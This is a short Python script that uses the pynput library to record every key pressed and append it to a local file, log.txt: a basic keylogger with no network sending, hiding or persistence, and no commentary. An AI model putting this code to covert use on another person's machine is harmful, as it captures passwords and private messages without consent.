from pynput import keyboard

def keyPressed(key):
    with open("log.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except AttributeError:
            match key:
                case keyboard.Key.backspace:
                    logKey.write("[Backspace]")
                case keyboard.Key.enter:
                    logKey.write("\n")
                case keyboard.Key.space:
                    logKey.write(" ")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()